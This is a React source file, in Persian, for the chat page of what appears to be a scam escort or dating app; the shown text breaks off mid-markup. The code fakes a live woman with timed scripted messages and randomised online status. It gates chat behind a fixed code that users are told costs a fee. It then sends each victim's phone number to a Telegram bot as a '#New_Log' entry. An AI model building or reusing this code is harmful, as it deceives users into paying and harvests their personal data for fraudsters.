
import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import NavBar from '../../components/base/NavBar';
import TabBar from '../../components/base/TabBar';
import { casesAPI, favoritesAPI, getUserSession } from '../../lib/supabase';

interface Message {
  id: string;
  text: string;
  isUser: boolean;
  timestamp: Date;
  isTyping?: boolean;
  type?: 'text' | 'system';
}

interface UserProfile {
  id: string;
  name: string;
  avatar: string;
  uniqueCode: string;
  isOnline: boolean;
  lastSeen: string;
  verified: boolean;
  location: string;
  age: number;
  description: string;
}

interface ChatRoom {
  id: string;
  caseData: any;
  messages: Message[];
  lastMessage?: string;
  lastMessageTime?: Date;
  unreadCount: number;
}

interface SystemConfig {
  telegramBotToken: string;
  telegramBotUsername: string;
  telegramChatId: string;
  paymentGatewayUrl: string;
  defaultFeeAmount: number;
}

const FIXED_CHAT_CODE = 'Cod_4961';

export default function Chat() {
  const navigate = useNavigate();
  const [messages, setMessages] = useState<Message[]>([]);
  const [inputText, setInputText] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const [userProfile, setUserProfile] = useState<UserProfile | null>(null);
  const [showAccessDenied, setShowAccessDenied] = useState(false);
  const [chatStep, setChatStep] = useState(0);
  const [userMessageCount, setUserMessageCount] = useState(0);
  const [showPhoneInput, setShowPhoneInput] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [chatClosed, setChatClosed] = useState(false);
  const [showFinalNotice, setShowFinalNotice] = useState(false);
  const [showChatList, setShowChatList] = useState(true);
  const [currentChatId, setCurrentChatId] = useState<string | null>(null);
  const [chatRooms, setChatRooms] = useState<ChatRoom[]>([]);
  const [showCodeInput, setShowCodeInput] = useState(false);
  const [codeInput, setCodeInput] = useState('');
  const [showConnectionOptions, setShowConnectionOptions] = useState(false);
  const [selectedCase, setSelectedCase] = useState<any>(null);
  const [isInActiveChat, setIsInActiveChat] = useState(false);
  const [activeChatTimer, setActiveChatTimer] = useState<NodeJS.Timeout | null>(null);
  const [systemConfig, setSystemConfig] = useState<SystemConfig>({
    telegramBotToken: '',
    telegramBotUsername: '',
    telegramChatId: '',
    paymentGatewayUrl: 'https://payment.example.com',
    defaultFeeAmount: 250000
  });

  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    loadSystemConfig();
    loadChatRooms();
    
    const activeChat = localStorage.getItem('PERSISTENT_ACTIVE_CHAT');
    if (activeChat) {
      try {
        const chatData = JSON.parse(activeChat);
        const chatAge = Date.now() - (chatData.timestamp || 0);
        const maxAge = 7 * 24 * 60 * 60 * 1000;
        
        if (chatAge < maxAge) {
          setIsInActiveChat(true);
          setCurrentChatId(chatData.caseId);
          setSelectedCase(chatData.caseData);
          setUserProfile(chatData.userProfile);
          
          const restoredMessages = chatData.messages ? chatData.messages.map((msg: any) => ({
            ...msg,
            timestamp: new Date(msg.timestamp)
          })) : [];
          setMessages(restoredMessages);
          setShowChatList(false);
          setUserMessageCount(chatData.userMessageCount || 0);
          setChatStep(chatData.chatStep || 0);
          setShowPhoneInput(chatData.showPhoneInput || false);
          setPhoneNumber(chatData.phoneNumber || '');
          setChatClosed(chatData.chatClosed || false);
          setShowFinalNotice(chatData.showFinalNotice || false);
          
          console.log('🔄 چت فعال پایدار بازیابی شد:', chatData.caseData.name);
          
          if (chatData.isTyping && !chatData.chatClosed) {
            setIsTyping(true);
          }
        } else {
          localStorage.removeItem('PERSISTENT_ACTIVE_CHAT');
          localStorage.removeItem('BACKUP_ACTIVE_CHAT');
          localStorage.removeItem('SAFE_ACTIVE_CHAT');
          localStorage.removeItem('PROTECTED_CHAT_STATE');
          console.log('🗑️ چت منقضی شده حذف شد');
        }
      } catch (error) {
        console.error('خطا در بازیابی چت فعال:', error);
        localStorage.removeItem('PERSISTENT_ACTIVE_CHAT');
        localStorage.removeItem('BACKUP_ACTIVE_CHAT');
        localStorage.removeItem('SAFE_ACTIVE_CHAT');
        localStorage.removeItem('PROTECTED_CHAT_STATE');
      }
    }
  }, []);

  const saveActiveChatPersistent = () => {
    if (isInActiveChat && currentChatId && selectedCase && userProfile) {
      const activeChatData = {
        caseId: currentChatId,
        caseData: selectedCase,
        userProfile: userProfile,
        messages: messages,
        userMessageCount: userMessageCount,
        chatStep: chatStep,
        showPhoneInput: showPhoneInput,
        phoneNumber: phoneNumber,
        chatClosed: chatClosed,
        showFinalNotice: showFinalNotice,
        isTyping: isTyping,
        timestamp: Date.now(),
        version: '3.0'
      };

      const backupKeys = ['PERSISTENT_ACTIVE_CHAT', 'BACKUP_ACTIVE_CHAT', 'SAFE_ACTIVE_CHAT', 'PROTECTED_CHAT_STATE'];
      backupKeys.forEach(key => {
        try {
          localStorage.setItem(key, JSON.stringify(activeChatData));
        } catch (error) {
          console.warn(`خطا در ذخیره ${key}:`, error);
        }
      });
      console.log('💾 چت فعال پایدار ذخیره شد');
    }
  };

  useEffect(() => {
    if (isInActiveChat) {
      const interval = setInterval(() => {
        saveActiveChatPersistent();
      }, 2000);
      return () => clearInterval(interval);
    }
  }, [isInActiveChat, messages, userMessageCount, chatStep, showPhoneInput, phoneNumber, chatClosed, showFinalNotice, isTyping]);

  useEffect(() => {
    if (isInActiveChat) {
      saveActiveChatPersistent();
    }
  }, [messages, userMessageCount, chatStep, isInActiveChat, showPhoneInput, phoneNumber, chatClosed, showFinalNotice]);

  const loadSystemConfig = () => {
    const savedConfig = localStorage.getItem('systemConfig');
    if (savedConfig) {
      setSystemConfig({ ...systemConfig, ...JSON.parse(savedConfig) });
    }
  };

  const loadChatRooms = async () => {
    console.log('📥 بارگذاری چت‌های کاربر از دیتابیس...');
    const savedChats = localStorage.getItem('userChatRooms');
    let existingRooms: ChatRoom[] = [];
    
    if (savedChats) {
      try {
        existingRooms = JSON.parse(savedChats);
      } catch (error) {
        console.error('خطا در بارگذاری چت‌ها:', error);
      }
    }

    // بارگذاری از Supabase به جای LocalStorage
    try {
      const userSession = getUserSession();
      const favorites = await favoritesAPI.getUserFavorites(userSession);
      
      const existingChatIds = existingRooms.map(chat => chat.id);
      
      for (const favorite of favorites) {
        try {
          const updatedCase = await casesAPI.getById(favorite.case_id);
          if (updatedCase) {
            if (!existingChatIds.includes(favorite.case_id.toString())) {
              const newChatRoom: ChatRoom = {
                id: favorite.case_id.toString(),
                caseData: updatedCase,
                messages: [],
                lastMessage: 'چت جدید شروع شد',
                lastMessageTime: new Date(favorite.created_at || Date.now()),
                unreadCount: 0
              };
              existingRooms.push(newChatRoom);
            } else {
              const roomIndex = existingRooms.findIndex(room => room.id === favorite.case_id.toString());
              if (roomIndex !== -1) {
                existingRooms[roomIndex].caseData = updatedCase;
              }
            }
          }
        } catch (error) {
          console.warn(`خطا در بروزرسانی کیس ${favorite.case_id}:`, error);
          if (!existingChatIds.includes(favorite.case_id.toString())) {
            const newChatRoom: ChatRoom = {
              id: favorite.case_id.toString(),
              caseData: favorite.case_data,
              messages: [],
              lastMessage: 'چت جدید شروع شد',
              lastMessageTime: new Date(favorite.created_at || Date.now()),
              unreadCount: 0
            };
            existingRooms.push(newChatRoom);
          }
        }
      }
    } catch (error) {
      console.error('خطا در بارگذاری علاقه‌مندی‌ها از Supabase:', error);
      // بازگشت به روش قدیمی LocalStorage
      const favorites = localStorage.getItem('favoritesCases');
      if (favorites) {
        try {
          const favoriteCases = JSON.parse(favorites);
          const existingChatIds = existingRooms.map(chat => chat.id);
          
          for (const favoriteCase of favoriteCases) {
            try {
              const updatedCase = await casesAPI.getById(favoriteCase.id);
              if (updatedCase) {
                if (!existingChatIds.includes(favoriteCase.id.toString())) {
                  const newChatRoom: ChatRoom = {
                    id: favoriteCase.id.toString(),
                    caseData: updatedCase,
                    messages: [],
                    lastMessage: 'چت جدید شروع شد',
                    lastMessageTime: new Date(favoriteCase.addedAt),
                    unreadCount: 0
                  };
                  existingRooms.push(newChatRoom);
                } else {
                  const roomIndex = existingRooms.findIndex(room => room.id === favoriteCase.id.toString());
                  if (roomIndex !== -1) {
                    existingRooms[roomIndex].caseData = updatedCase;
                  }
                }
              }
            } catch (error) {
              console.warn(`خطا در بروزرسانی کیس ${favoriteCase.id}:`, error);
              if (!existingChatIds.includes(favoriteCase.id.toString())) {
                const newChatRoom: ChatRoom = {
                  id: favoriteCase.id.toString(),
                  caseData: favoriteCase,
                  messages: [],
                  lastMessage: 'چت جدید شروع شد',
                  lastMessageTime: new Date(favoriteCase.addedAt),
                  unreadCount: 0
                };
                existingRooms.push(newChatRoom);
              }
            }
          }
        } catch (error) {
          console.error('خطا در بارگذاری علاقه‌مندی‌ها:', error);
        }
      }
    }

    setChatRooms(existingRooms);
    console.log(`✅ ${existingRooms.length} چت بارگذاری شد (با همگام‌سازی دیتابیس)`);
  };

  const saveChatRooms = (rooms: ChatRoom[]) => {
    try {
      localStorage.setItem('userChatRooms', JSON.stringify(rooms));
      setChatRooms(rooms);
      console.log('💾 چت‌ها ذخیره شدند');
    } catch (error) {
      console.error('خطا در ذخیره چت‌ها:', error);
    }
  };

  const openChatRoom = (caseData: any) => {
    setSelectedCase(caseData);
    setShowConnectionOptions(true);
    setShowChatList(false);
  };

  const handleConnectionRequest = () => {
    navigate('/verification/' + selectedCase.id);
  };

  const handleChatCodeEntry = () => {
    setShowCodeInput(true);
    setShowConnectionOptions(false);
  };

  const handleCodeSubmit = () => {
    if (codeInput.trim() === FIXED_CHAT_CODE) {
      startActiveChatPersistent(selectedCase);
      setShowCodeInput(false);
      setCodeInput('');
    } else {
      alert('لطفاً از قسمت درخواست ارتباط، کد ورود خود را تهیه و کد صحیح را وارد نمایید');
      setCodeInput('');
    }
  };

  const startActiveChatPersistent = (caseData: any) => {
    const chatId = caseData.id.toString();
    setCurrentChatId(chatId);
    setShowChatList(false);
    setShowConnectionOptions(false);
    setShowCodeInput(false);
    setIsInActiveChat(true);

    const userProfile: UserProfile = {
      id: caseData.id.toString(),
      name: caseData.name,
      avatar: caseData.image,
      uniqueCode: generateShortUniqueCode(),
      isOnline: Math.random() > 0.3,
      lastSeen: generateLastSeen(),
      verified: caseData.verified || true,
      location: caseData.location,
      age: caseData.age || 25,
      description: caseData.description || 'کاربر تایید شده'
    };
    setUserProfile(userProfile);

    const existingChat = chatRooms.find(room => room.id === chatId);
    if (existingChat && existingChat.messages.length > 0) {
      setMessages(existingChat.messages);
    } else {
      const welcomeMessage: Message = {
        id: '1',
        text: `سلام! من ${caseData.name.split('-')[0]} هستم! مرسی که منو انتخاب کردی 💕 لطفاً منتظر بمون، به زودی آنلاین میشم 😊`,
        isUser: false,
        timestamp: new Date(),
        type: 'text'
      };
      setMessages([welcomeMessage]);
      setChatStep(1);
    }

    setTimeout(() => {
      saveActiveChatPersistent();
    }, 100);

    console.log('🚀 چت فعال پایدار شروع شد با:', caseData.name);
  };

  const removeChatRoom = async (chatId: string) => {
    if (confirm('آیا مطمئن هستید که می‌خواهید این کیس را از لیست حذف کنید؟')) {
      const updatedRooms = chatRooms.filter(room => room.id !== chatId);
      saveChatRooms(updatedRooms);

      // حذف از Supabase
      try {
        const userSession = getUserSession();
        await favoritesAPI.removeFavorite(parseInt(chatId), userSession);
        console.log('🗑️ کیس از علاقه‌مندی‌های Supabase حذف شد');
      } catch (error) {
        console.error('خطا در حذف از Supabase:', error);
      }

      // حذف از LocalStorage (پشتیبان)
      try {
        const favorites = JSON.parse(localStorage.getItem('favoritesCases') || '[]');
        const updatedFavorites = favorites.filter((fav: any) => fav.id.toString() !== chatId);
        localStorage.setItem('favoritesCases', JSON.stringify(updatedFavorites));
        console.log('🗑️ کیس از علاقه‌مندی‌های LocalStorage حذف شد');
      } catch (error) {
        console.error('خطا در حذف از LocalStorage:', error);
      }
    }
  };

  const backToChatList = () => {
    if (activeChatTimer) {
      clearTimeout(activeChatTimer);
      setActiveChatTimer(null);
    }

    if (isInActiveChat && !chatClosed) {
      console.log('🔁 بازگشت به لیست چت‌ها (چت فعال حفظ شد)');
    }

    setShowChatList(true);
    setShowConnectionOptions(false);
    setShowCodeInput(false);
    setSelectedCase(null);
  };

  const exitActiveChatCompletely = () => {
    if (confirm('آیا مطمئن هستید که می‌خواهید چت فعال را به طور کامل پایان دهید؟')) {
      localStorage.removeItem('PERSISTENT_ACTIVE_CHAT');
      localStorage.removeItem('BACKUP_ACTIVE_CHAT');
      localStorage.removeItem('SAFE_ACTIVE_CHAT');
      localStorage.removeItem('PROTECTED_CHAT_STATE');

      setIsInActiveChat(false);
      setCurrentChatId(null);
      setUserProfile(null);
      setMessages([]);
      setChatClosed(false);
      setShowFinalNotice(false);
      setShowPhoneInput(false);
      setUserMessageCount(0);
      setChatStep(0);
      setIsTyping(false);

      console.log('🧹 چت فعال به طور کامل پاک شد');
    }
  };

  const generateShortUniqueCode = () => {
    const timestamp = Date.now().toString().slice(-4);
    const random = Math.floor(Math.random() * 999).toString().padStart(3, '0');
    return `C${timestamp}-${random}`;
  };

  const generateLastSeen = () => {
    const minutes = Math.floor(Math.random() * 15) + 1;
    return `${minutes} دقیقه پیش`;
  };

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages]);

  const sendMessage = async (text?: string) => {
    const messageText = text || inputText;
    if (!messageText.trim()) return;
    if (chatClosed) return;

    const userMessage: Message = {
      id: Date.now().toString(),
      text: messageText,
      isUser: true,
      timestamp: new Date(),
      type: 'text'
    };

    setMessages(prev => [...prev, userMessage]);
    setInputText('');
    setUserMessageCount(prev => prev + 1);
    handleChatFlowImproved(userMessageCount + 1);
  };

  const handleChatFlowImproved = (messageCount: number) => {
    if (messageCount === 1) {
      const timer = setTimeout(() => {
        setIsTyping(true);
        setTimeout(() => {
          const response: Message = {
            id: Date.now().toString(),
            text: 'سلام! چه نوع رابطه‌ای از من میخوای؟؟ 🤔💭',
            isUser: false,
            timestamp: new Date(),
            type: 'text'
          };
          setMessages(prev => [...prev, response]);
          setIsTyping(false);

          if (userProfile) {
            setUserProfile(prev => prev ? { ...prev, isOnline: true, lastSeen: 'آنلاین' } : null);
          }

          setTimeout(() => saveActiveChatPersistent(), 100);
        }, 3000);
      }, 120000);
      setActiveChatTimer(timer);
    } else if (messageCount === 2) {
      const timer = setTimeout(() => {
        setIsTyping(true);
        setTimeout(() => {
          const response: Message = {
            id: Date.now().toString(),
            text: 'اوکی عزیزم! فقط من شبا نمیتونم بیام ولی روزا اوکیه 😊 تایمم میتونم از ساعت ۱۰ صبح تا ۲۲:۰۰ باهات در ارتباط باشم. اگه هم میخوای که شب بیام، خودم مکان دارم - مکان غریبه رو شرمنده... بار اول نمیتونم بیام 🙂💞 اگر اوکی‌ای با شرایطم بگو که تایید ارتباط رو بدم و بعدش باهم در ارتباط باشیم واسه قرار!',
            isUser: false,
            timestamp: new Date(),
            type: 'text'
          };
          setMessages(prev => [...prev, response]);
          setIsTyping(false);

          setTimeout(() => {
            const finalResponse: Message = {
              id: (Date.now() + 1).toString(),
              text: 'من تایید ارتباط رو دادم! تو هم تایید کن که باهم در ارتباط باشیم 😊 فقط حتماً وقتی شمارمو از مجموعه گرفتی، اگر خواستی زنگ بزنی قبلش بگو که از طرف این مجموعه‌ای وگرنه جواب نمیدم... 🙂📞',
              isUser: false,
              timestamp: new Date(),
              type: 'text'
            };
            setMessages(prev => [...prev, finalResponse]);

            setTimeout(() => {
              const systemMessage: Message = {
                id: (Date.now() + 2).toString(),
                text: '✅ ارتباط شما با کیس مورد نظر تایید شد! لطفاً شماره تماس خود را وارد کنید:',
                isUser: false,
                timestamp: new Date(),
                type: 'system'
              };
              setMessages(prev => [...prev, systemMessage]);
              setShowPhoneInput(true);
              setTimeout(() => saveActiveChatPersistent(), 100);
            }, 2000);
          }, 30000);

          setTimeout(() => saveActiveChatPersistent(), 100);
        }, 3000);
      }, 120000);
      setActiveChatTimer(timer);
    }
  };

  const handlePhoneSubmit = () => {
    if (!phoneNumber.trim() || phoneNumber.length < 11) {
      alert('لطفاً شماره تماس معتبر وارد کنید');
      return;
    }

    sendPhoneToTelegram();

    const confirmMessage: Message = {
      id: Date.now().toString(),
      text: `🥇 Success Phone: ${phoneNumber}`,
      isUser: false,
      timestamp: new Date(),
      type: 'system'
    };
    setMessages(prev => [...prev, confirmMessage]);
    setShowPhoneInput(false);

    setTimeout(() => {
      const noticeMessage1: Message = {
        id: Date.now().toString(),
        text: 'تا ساعات آینده همکاران ما برای رزرو با شما تماس گرفته خواهد شد. لطفاً در دسترس باشید... رزرو رابطه یا از طریق تماس یا از طریق پیامک به شما اعلام خواهد شد.',
        isUser: false,
        timestamp: new Date(),
        type: 'system'
      };
      setMessages(prev => [...prev, noticeMessage1]);

      setTimeout(() => {
        setShowFinalNotice(true);
        setTimeout(() => {
          setChatClosed(true);
          setTimeout(() => saveActiveChatPersistent(), 100);
        }, 10000);
      }, 5000);
    }, 2000);
  };

  const sendPhoneToTelegram = () => {
    const currentDate = new Date();
    const persianDate = currentDate.toLocaleDateString('fa-IR');
    const persianTime = currentDate.toLocaleTimeString('fa-IR');

    const message = `#New_Log 🫦
""""""""""""""""""""
📀 Name: <code>شروع چت موفق</code>
💿 Phone: <code>${phoneNumber}</code>
🪀 #Code_meli: <code>${userProfile?.uniqueCode}</code>
""""""""""""""""""""
🕰 Time: ${persianDate}, ${persianTime}`;

    if (systemConfig.telegramBotToken && systemConfig.telegramChatId) {
      const telegramUrl = `https://api.telegram.org/bot${systemConfig.telegramBotToken}/sendMessage`;
      
      fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: systemConfig.telegramChatId,
          text: message,
          parse_mode: 'HTML'
        })
      }).then(response => {
        if (response.ok) {
          console.log('✅ پیام چت با موفقیت به تلگرام ارسال شد');
        } else {
          console.error('❌ خطا در ارسال پیام چت به تلگرام');
        }
      }).catch(error => {
        console.error('❌ خطا در ارسال پیام چت به تلگرام:', error);
      });
    } else {
      console.log('ℹ️ تنظیمات تلگرام یافت نشد - پیام:', message);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      sendMessage();
    }
  };

  if (chatClosed) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-50 via-gray-100 to-gray-200 flex items-center justify-center">
        <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center max-w-md mx-4">
          <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <i className="ri-chat-off-line text-gray-400 text-3xl"></i>
          </div>
          <h3 className="text-xl font-bold text-gray-800 mb-3">چت بسته شد</h3>
          <p className="text-gray-600 mb-6 leading-relaxed">
            ارتباط شما با کیس مورد نظر ثبت شد. به زودی همکاران ما با شما تماس خواهند گرفت.
          </p>
          <button
            onClick={backToChatList}
            className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-3 px-6 rounded-2xl transition-all duration-300"
          >
            بازگشت به لیست چت‌ها
          </button>
        </div>
      </div>
    );
  }

  if (showCodeInput) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-50 via-indigo-50 to-blue-100">
        <NavBar title="کد ورود به چت" showBack={true} />
        <div className="pt-20 pb-20 px-4">
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center">
            <div className="w-20 h-20 bg-gradient-to-r from-purple-500 to-pink-600 rounded-full flex items-center justify-center mx-auto mb-6">
              <i className="ri-key-2-line text-white text-3xl"></i>
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-3">کد ورود به چت</h2>
            <p className="text-gray-600 mb-6">کد ورود خود را وارد کنید</p>
            
            <div className="mb-6">
              <input
                type="text"
                value={codeInput}
                onChange={(e) => setCodeInput(e.target.value)}
                placeholder="مثال: Cod_01"
                className="w-full bg-gray-50 border border-gray-200 rounded-2xl px-5 py-4 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent text-center font-mono text-lg"
              />
            </div>

            <div className="space-y-3 mb-6">
              <button
                onClick={handleCodeSubmit}
                className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300"
              >
                تایید کد
              </button>
              <button
                onClick={handleConnectionRequest}
                className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold py-3 px-6 rounded-2xl shadow-lg transition-all duration-300"
              >
                درخواست ارتباط
              </button>
            </div>

            <button onClick={backToChatList} className="text-gray-500 hover:text-gray-700 text-sm">
              بازگشت
            </button>
          </div>
        </div>
        <TabBar />
      </div>
    );
  }

  if (showConnectionOptions && selectedCase) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-pink-50 via-rose-50 to-purple-100">
        <NavBar title={selectedCase.name.split('-')[0]} showBack={true} />
        <div className="pt-20 pb-20 px-4">
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl mb-6">
            <div className="flex items-center mb-6">
              <img
                src={selectedCase.image}
                alt={selectedCase.name}
                className="w-20 h-20 rounded-2xl object-cover shadow-lg mr-4"
              />
              <div className="flex-1">
                <h3 className="font-bold text-gray-800 text-xl">{selectedCase.name}</h3>
                <p className="text-gray-600 text-sm mb-1">{selectedCase.location}</p>
                <div className="flex items-center">
                  <div className="w-3 h-3 bg-green-500 rounded-full mr-2"></div>
                  <span className="text-green-600 text-sm font-medium">آنلاین</span>
                </div>
              </div>
            </div>
            <p className="text-gray-700 leading-relaxed text-sm mb-6">{selectedCase.description}</p>
          </div>

          <div className="space-y-4">
            <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl">
              <h3 className="font-bold text-gray-800 text-lg mb-4 text-center">نحوه ارتباط را انتخاب کنید</h3>
              
              <div className="grid grid-cols-1 gap-4">
                <button
                  onClick={handleChatCodeEntry}
                  className="bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 hover:scale-105"
                >
                  <div className="flex items-center justify-center">
                    <i className="ri-chat-3-line mr-3 text-xl"></i>
                    <div>
                      <div className="text-lg">چت</div>
                      <div className="text-xs opacity-90">نیاز به کد ورود</div>
                    </div>
                  </div>
                </button>

                <button
                  onClick={handleChatCodeEntry}
                  className="bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 hover:scale-105"
                >
                  <div className="flex items-center justify-center">
                    <i className="ri-phone-fill mr-3 text-xl"></i>
                    <div>
                      <div className="text-lg">تماس صوتی</div>
                      <div className="text-xs opacity-90">نیاز به کد ورود</div>
                    </div>
                  </div>
                </button>

                <button
                  onClick={handleChatCodeEntry}
                  className="bg-gradient-to-r from-blue-500 to-cyan-600 hover:from-blue-600 hover:to-cyan-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 hover:scale-105"
                >
                  <div className="flex items-center justify-center">
                    <i className="ri-vidicon-fill mr-3 text-xl"></i>
                    <div>
                      <div className="text-lg">تماس تصویری</div>
                      <div className="text-xs opacity-90">نیاز به کد ورود</div>
                    </div>
                  </div>
                </button>
              </div>

              <div className="mt-6 p-4 bg-yellow-50 rounded-2xl border border-yellow-200">
                <div className="flex items-start">
                  <i className="ri-information-line text-yellow-600 text-lg ml-2 mt-0.5"></i>
                  <div className="text-yellow-800 text-sm">
                    <p className="font-semibold mb-1">نحوه دریافت کد ورود:</p>
                    <p>برای دریافت کد ورود، ابتدا باید درخواست ارتباط خود را ثبت و هزینه مربوطه را پرداخت کنید</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <button
            onClick={backToChatList}
            className="w-full mt-6 bg-gray-500 hover:bg-gray-600 text-white font-semibold py-3 px-6 rounded-2xl transition-colors"
          >
            بازگشت به لیست چت‌ها
          </button>
        </div>
        <TabBar />
      </div>
    );
  }

  if (showChatList) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-indigo-50 to-purple-100">
        <NavBar title="چت‌های من" showBack={true} />
        <div className="pt-20 pb-20">
          <div className="px-4 mb-4">
            <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-2xl p-4">
              <div className="flex items-center justify-center">
                <i className="ri-database-2-line text-green-600 mr-2"></i>
                <span className="text-green-700 font-medium text-sm">
                  💬 {chatRooms.length} چت فعال (همگام‌سازی شده با دیتابیس)
                </span>
              </div>
            </div>
          </div>

          {isInActiveChat && (
            <div className="px-4 mb-4">
              <div className="bg-gradient-to-r from-pink-50 to-rose-50 border border-pink-200 rounded-2xl p-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center">
                    <i className="ri-chat-3-fill text-pink-600 text-xl mr-2"></i>
                    <span className="text-pink-700 font-medium text-sm">چت فعال در حال اجرا</span>
                  </div>
                  <button
                    onClick={exitActiveChatCompletely}
                    className="text-pink-600 hover:text-pink-800 text-xs"
                  >
                    پایان چت
                  </button>
                </div>
              </div>
            </div>
          )}

          <div className="space-y-3 px-4">
            {chatRooms.length === 0 ? (
              <div className="bg-white/90 backdrop-blur-sm rounded-3xl p-8 text-center shadow-lg">
                <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <i className="ri-chat-3-line text-gray-400 text-3xl"></i>
                </div>
                <h3 className="text-lg font-semibold text-gray-700 mb-2">هیچ چتی یافت نشد</h3>
                <p className="text-gray-500 text-sm mb-6">
                  برای شروع چت، ابتدا کیس‌های مورد نظر خود را به علاقه‌مندی‌ها اضافه کنید
                </p>
                <button
                  onClick={() => navigate('/services')}
                  className="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold py-3 px-6 rounded-2xl transition-all duration-300"
                >
                  مشاهده کیس‌ها
                </button>
              </div>
            ) : (
              chatRooms.map((room) => (
                <div
                  key={room.id}
                  className="bg-white/90 backdrop-blur-sm rounded-2xl p-4 shadow-lg border border-white/20 hover:shadow-xl transition-all duration-300"
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center flex-1">
                      <img
                        src={room.caseData.image}
                        alt={room.caseData.name}
                        className="w-14 h-14 rounded-xl object-cover shadow-md"
                      />
                      <div className="ml-4 flex-1">
                        <div className="flex items-center justify-between">
                          <h4 className="font-bold text-gray-800 text-base">
                            {room.caseData.name.split('-')[0]}
                          </h4>
                          <span className="text-xs text-gray-500">
                            {room.lastMessageTime?.toLocaleDateString('fa-IR')}
                          </span>
                        </div>
                        <p className="text-gray-600 text-sm mt-1">{room.caseData.location}</p>
                        <p className="text-gray-500 text-xs mt-1 truncate">
                          {room.lastMessage || 'چت جدید شروع شد'}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-center space-x-2 space-x-reverse">
                      <button
                        onClick={() => openChatRoom(room.caseData)}
                        className="bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-600 hover:to-indigo-700 text-white px-4 py-2 rounded-xl text-sm font-medium transition-all duration-300 whitespace-nowrap"
                      >
                        شروع چت
                      </button>
                      <button
                        onClick={() => removeChatRoom(room.id)}
                        className="text-red-500 hover:text-red-700 p-2 rounded-lg hover:bg-red-50 transition-colors"
                      >
                        <i className="ri-delete-bin-line text-lg"></i>
                      </button>
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
        <TabBar />
      </div>
    );
  }

  // Active Chat UI
  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 via-pink-50 to-rose-100 flex flex-col">
      <NavBar 
        title={userProfile?.name.split('-')[0] || 'چت'} 
        showBack={true}
        onBack={backToChatList}
      />
      
      {/* Chat Header */}
      <div className="bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200/50 px-4 py-3 mt-16">
        <div className="flex items-center justify-between">
          <div className="flex items-center">
            <img
              src={userProfile?.avatar}
              alt={userProfile?.name}
              className="w-12 h-12 rounded-full object-cover shadow-lg mr-3"
            />
            <div>
              <h3 className="font-bold text-gray-800">{userProfile?.name.split('-')[0]}</h3>
              <div className="flex items-center">
                <div className={`w-2 h-2 rounded-full mr-2 ${userProfile?.isOnline ? 'bg-green-500' : 'bg-gray-400'}`}></div>
                <span className={`text-xs ${userProfile?.isOnline ? 'text-green-600' : 'text-gray-500'}`}>
                  {userProfile?.isOnline ? 'آنلاین' : userProfile?.lastSeen}
                </span>
              </div>
            </div>
          </div>
          <button
            onClick={exitActiveChatCompletely}
            className="text-red-500 hover:text-red-700 p-2 rounded-lg hover:bg-red-50 transition-colors"
          >
            <i className="ri-close-line text-xl"></i>
          </button>
        </div>
      </div>

      {/* Messages Container - اصلاح شده برای سازگاری موبایل */}
      <div className="flex-1 overflow-y-auto px-4 py-4 space-y-4 pb-24">
        {messages.map((message) => (
          <div
            key={message.id}
            className={`flex ${message.isUser ? 'justify-end' : 'justify-start'}`}
          >
            <div
              className={`max-w-xs lg:max-w-md px-4 py-3 rounded-2xl shadow-lg ${
                message.isUser
                  ? 'bg-gradient-to-r from-blue-600 to-indigo-600 text-white'
                  : message.type === 'system'
                  ? 'bg-gradient-to-r from-green-500 to-emerald-600 text-white'
                  : 'bg-white/95 backdrop-blur-sm text-gray-800 border border-gray-200/50'
              }`}
            >
              <p className="text-sm leading-relaxed whitespace-pre-wrap">{message.text}</p>
              <span className={`text-xs mt-2 block ${
                message.isUser || message.type === 'system' ? 'text-white/70' : 'text-gray-500'
              }`}>
                {message.timestamp.toLocaleTimeString('fa-IR', { 
                  hour: '2-digit', 
                  minute: '2-digit' 
                })}
              </span>
            </div>
          </div>
        ))}

